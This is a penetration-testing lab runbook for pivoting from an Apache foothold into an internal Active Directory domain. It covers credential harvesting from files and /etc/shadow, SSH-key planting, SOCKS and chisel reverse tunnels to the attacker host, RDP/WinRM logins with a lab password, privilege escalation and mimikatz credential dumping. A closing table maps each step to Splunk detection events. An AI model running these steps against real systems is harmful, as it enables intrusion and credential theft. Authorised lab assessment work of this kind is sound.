# Phase 6 — Keys of the Gods (Pivot + Lateral Movement)

> ISOLATED LAB ONLY. Authorised assessment. Host-only network.

Runbook for moving from the gatehouse foothold into the internal network and
escalating. Chosen approach: **`ssh -D` dynamic SOCKS** for the pivot, **RDP as
`charon`** for lateral access.

## Where we start

```
Kali (attacker)
  │  foothold: reverse shell as `daemon` (Apache 2.4.49 CVE RCE)
  ▼
Gatehouse 10.1.1.10  (Ubuntu, DUAL-HOMED: DMZ 10.1.1.x + internal 192.168.1.x)
  │  nmap already installed here
  ▼
Internal 192.168.1.0/24
  - DC            192.168.1.100   (hades.underworld)
  - Splunk        192.168.1.6
  - Workstation   192.168.1.??    <- to be built + domain-joined
```

AD creds (from phishing): `charon / Ferryman1!` — **normal** domain user, can RDP.
Other wardens same password: `cerberus`, `minos`, `persephone`, `hades`.

---

## Step 1 — Stand up + domain-join a Windows workstation (VM console / noVNC)

Do this at the VM console, not over the pivot.

1. Build a Windows 10/11 VM on the **internal** vSwitch (192.168.1.0/24).
2. Point DNS at the DC (required for domain discovery):
   ```powershell
   Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 192.168.1.100
   # optional static IP:
   # New-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress 192.168.1.50 -PrefixLength 24 -DefaultGateway 192.168.1.1
   ```
3. Join the domain (use an account allowed to join, e.g. `hades`):
   ```powershell
   Add-Computer -DomainName "hades.underworld" -Credential (Get-Credential) -Restart
   ```
4. After reboot, log in once as `HADES\charon` so the user profile is created.
5. Enable RDP and authorise `charon`:
   ```powershell
   Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0
   Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
   Add-LocalGroupMember -Group "Remote Desktop Users" -Member "HADES\charon"
   ```

## Step 2 — Internal recon from the foothold (on the gatehouse, as `daemon`)

nmap is already on the gatehouse (installed by `install_apache.sh`).

```bash
nmap -F -Pn 192.168.1.0/24                          # live hosts + top ports
nmap -p 3389,445,5985,88,389,636 -Pn 192.168.1.0/24 # RDP / SMB / WinRM / DC
```
Confirm the DC (88/389/636), Splunk (.6), and the workstation (3389 open).

## Step 3 — Get an SSH credential on the gatehouse  (dependency for `ssh -D`)

`daemon` (RCE) is not an SSH login. `ssh -D` needs a real SSH account on 10.1.1.10.
In-lab routes, easiest first:

```bash
# local accounts with a shell
grep -E 'sh$' /etc/passwd ; ls -la /home
# readable creds/keys as daemon
find / -name 'authorized_keys' -o -name 'id_*' 2>/dev/null
cat cgi-bin/login.py | grep -i -E 'AD_|pass|bind'   # AD bind config
cat db/setup_db.sh db/schema.sql | grep -i -E 'pass|styx|hades_app'
cat /home/*/.bash_history 2>/dev/null
```
- Try the admin/sudo user that built the box (the one who ran `sudo ./install_apache.sh`) — check for a reused lab password (`Ferryman1!`).
- If you can escalate `daemon` → user/root: append your Kali pubkey to that user's
  `~/.ssh/authorized_keys`, or read `/etc/shadow` and crack offline.

**Goal:** `ssh <user>@10.1.1.10` works.
**Fallback if no SSH cred:** pivot with `chisel` or `ligolo-ng` straight from the
`daemon` shell (no creds needed) — see note at the bottom.

## Step 4 — Dynamic SOCKS pivot (`ssh -D`) from Kali

The gatehouse is dual-homed, so its sshd reaches 192.168.1.0/24 for you — no IP
forwarding to set up.

```bash
ssh -D 1080 -N <user>@10.1.1.10        # opens SOCKS5 on 127.0.0.1:1080
```
proxychains (`/etc/proxychains4.conf`): `socks5 127.0.0.1 1080`
```bash
proxychains nmap -Pn -p3389 192.168.1.50   # sanity check through the tunnel
```

## Step 5 — RDP lateral as `charon`

```bash
proxychains xfreerdp /u:charon /d:hades.underworld /p:'Ferryman1!' \
  /v:192.168.1.50 /cert:ignore +clipboard /dynamic-resolution
```
(RDP over SOCKS can be laggy. Painless alternative while you have the cred:
`proxychains evil-winrm -i 192.168.1.50 -u charon -p 'Ferryman1!'` if WinRM/5985 is open.)

## Step 6 — Local privilege escalation on the workstation

As `charon` (normal user), enumerate then escalate:

```powershell
whoami /priv ; whoami /groups
systeminfo
# quick wins
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
- Run **winPEAS** for unquoted service paths, writable service binaries, scheduled
  tasks, stored creds.
- If `SeImpersonatePrivilege` is present → PrintSpoofer / GodPotato.
- Once local admin → dump cached creds (LSASS/mimikatz) and move toward the DC with
  the `hades` credential via PsExec/WinRM.

## Step 7 — Blue team / Splunk detection mapping

The assessment asks you to assess defensive controls. Document what each technique
generates (Windows Security log → Splunk 192.168.1.6):

| Technique | Event / log | Where to see it |
|---|---|---|
| Domain join | 4741 (computer acct created), 4624 | DC security log |
| RDP logon (charon) | **4624 Logon Type 10** (RemoteInteractive), 4778 | Workstation |
| Failed RDP | 4625 Type 10 | Workstation |
| SSH pivot | `Accepted password/publickey` | Gatehouse `/var/log/auth.log` |
| Internal nmap sweep | connection spikes / IDS, pfSense cross-zone logs | pfSense / Splunk |
| winPEAS / mimikatz | 4688 proc creation; Sysmon EID 1; LSASS access Sysmon EID 10 | Workstation |

Example SPL: `index=* EventCode=4624 Logon_Type=10` to catch the RDP lateral move.

---

### Note — pivot fallback (no SSH cred)

If Step 3 yields nothing, skip `ssh -D` and tunnel from the `daemon` foothold:
- **chisel:** `chisel server -p 8000 --reverse` on Kali; `chisel client KALI:8000 R:1080:socks` on the gatehouse. Then proxychains as in Step 4.
- **ligolo-ng:** proxy on Kali, agent on the gatehouse → full tun interface to 192.168.1.0/24 (nicer for RDP than SOCKS).
